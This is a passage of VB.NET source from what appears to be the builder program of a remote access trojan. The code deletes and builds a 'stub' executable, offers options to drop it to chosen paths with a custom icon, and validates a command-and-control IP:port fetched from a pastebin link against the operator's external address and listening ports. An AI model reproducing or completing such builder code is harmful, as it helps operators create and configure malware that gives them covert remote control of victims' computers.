                    Try : IO.File.Delete(Application.StartupPath & "\Misc\Stub\Stub.exe") : Catch : End Try
                End If
            End If
        Catch ex1 As Exception
            MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
            Return
        End Try

    End Sub

    Private Sub _drop_CheckedChanged(sender As Object, e As EventArgs) Handles _drop.CheckedChanged
        If _drop.Checked = True Then
            _exe.Enabled = True
            _path1.Enabled = True
            _path2.Enabled = True
        Else
            _exe.Enabled = False
            _path1.Enabled = False
            _path2.Enabled = False
        End If
    End Sub

    Private Sub MetroTile1_Click(sender As Object, e As EventArgs) Handles MetroTile1.Click
        Try : BackgroundWorker2.RunWorkerAsync() : Catch : End Try
    End Sub

    Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork
        Try
            Dim x As String
            Dim wc As New Net.WebClient
            Dim rx As New Text.RegularExpressions.Regex("^(?:(?:25[0-5]|2[0-4]\d|[01]\d\d|\d?\d)(?(?=\.?\d)\.)){4}$")
            x = wc.DownloadString(_pastebin.Text)

            If rx.IsMatch(x.Split(":")(0)) AndAlso x.Split(":")(1) <= 65535 Then
                If x.Split(":")(0) = GetExternalAddress() AndAlso S_Settings.PORT.Contains(x.Split(":")(1)) Then
                    MsgBox("Valid! " + x, MsgBoxStyle.Information)
                Else
                    MsgBox(x + Environment.NewLine + "IP or port doesn't match your current settings", MsgBoxStyle.Critical)
                End If
            Else
                MsgBox("Wrong format", MsgBoxStyle.Critical)
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub

    Private Sub _icon_CheckedChanged(sender As Object, e As EventArgs) Handles _icon.CheckedChanged
        Try
            If _icon.Checked = True Then
                Dim o As New OpenFileDialog
                With o
                    .Filter = "*.ico (*.ico)| *.ico"
                    .InitialDirectory = Application.StartupPath + "\Misc\Icons"
                    .Title = "Select Icon"
                End With

                If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                    PictureBox1.ImageLocation = o.FileName
                Else
                    _icon.Checked = False
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
        End Try
    End Sub





#End Region


End Class